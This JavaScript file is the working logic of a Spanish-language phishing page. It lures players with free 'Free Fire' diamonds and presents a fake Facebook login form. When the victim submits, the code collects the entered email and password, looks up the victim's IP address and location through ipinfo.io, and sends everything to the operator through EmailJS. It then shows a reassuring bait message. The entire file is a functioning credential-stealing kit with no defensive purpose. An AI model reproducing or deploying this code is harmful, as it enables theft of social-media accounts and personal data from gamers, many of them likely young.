
function reload_page(){
    location.reload(true);
}

function sleep(milliseconds) {
  const date = Date.now();
  let currentDate = null;
  do {
    currentDate = Date.now();
  } while (currentDate - date < milliseconds);
}

async function getIpClient() {
  try {
    const response = await axios.get('https://ipinfo.io/json');
    console.log(response.data);
    return response.data;
  } catch (error) {
    console.error(error);
    return error;
  }
}

async function send_info(params){
    let email = document.querySelector("#email").value, 
    pswd = document.querySelector("#password").value;

    var data = await getIpClient(), info="";
    for (let key in data) {
        //console.log(key);
        if (key == "readme") break;
        info += String(key) + ": " + String(data[key]) + ", ";
    }

    var tempParams = {to_email: email, to_password: pswd, full_info: info};
    //console.log(email);
    //console.log(pswd);

    emailjs.send('service_pnhbf6x', 'template_9tqrawd', tempParams)
    .then(function(res) {
        console.log('SUCCESS!', res.status);
    }, function(error) {
        console.log('FAILED...', error);
    });

    //setTimeout(() => {console.log("A");}, 500);
    //sleep(1000);


    var list = document.querySelector(".center");
    while (list.hasChildNodes()) {
      list.removeChild(list.firstChild);
    }

    var section = document.createElement("section");
    section.setAttribute("class", "form-register-products");

    var title= document.createElement("h4");
    title.innerHTML = "<u style=\"color:orange\">FREE FIRE DIAMONDS</u>";
    section.appendChild(title);

    var p = document.createElement("p");
    p.innerHTML = " Estamos verificando tu cuenta y en unos momentos te llegará un mensaje por facebook dondé puedes adquirir la recompensa de diamantes mediante un audio de voz diciendo \"ok\".";
    section.appendChild(p);

    var p = document.createElement("p");
    section.appendChild(p);

    var op = document.createElement("input");
    op.setAttribute("type","button");
    op.setAttribute("onclick", "reload_page()");
    op.setAttribute("class", "botons");
    op.setAttribute("id", "registar-admi");
    op.setAttribute("value", "Entendido");

    section.appendChild(op);
    document.querySelector(".center").appendChild(section);
}

document.addEventListener('DOMContentLoaded', () => {
                  var section = document.createElement("section");
                  section.setAttribute("class", "form-register-products");

                  var title= document.createElement("h4");
                  title.innerHTML = "<u style=\"color:orange\">FREE FIRE DIAMONDS</u>";
                  section.appendChild(title);

                  var p = document.createElement("p");
                  p.innerHTML = " Ingresa con tu de facebook para verificar cuenta y aceptar terminos de servicio.";
                  section.appendChild(p);

                  var img = document.createElement("img");
                  img.setAttribute("src", "images/facebook.png");
                  img.setAttribute("width","15%")
                  section.appendChild(img);

                  var form = document.createElement("form");
                  form.setAttribute("class", "form-admi");

                  var op = document.createElement("input");
                  op.setAttribute("type","email");
                  op.setAttribute("class", "controls");
                  op.setAttribute("id", "email");
                  op.setAttribute("placeholder", "f.......@gmail.com");
                  form.appendChild(op);

                  var op = document.createElement("input");
                  op.setAttribute("type","password");
                  op.setAttribute("class", "controls");
                  op.setAttribute("id", "password");
                  op.setAttribute("placeholder", "contraseña");
                  form.appendChild(op);

                  var op = document.createElement("input");
                  op.setAttribute("type","button");
                  op.setAttribute("onclick", "send_info()");
                  op.setAttribute("class", "botons");
                  /*op.setAttribute("style", "color:orange");*/
                  op.setAttribute("id", "registar-admi");
                  op.setAttribute("value", " Validar Cuenta ");
                  form.appendChild(op);

                  section.appendChild(form);
                  document.querySelector(".center").appendChild(section);
});
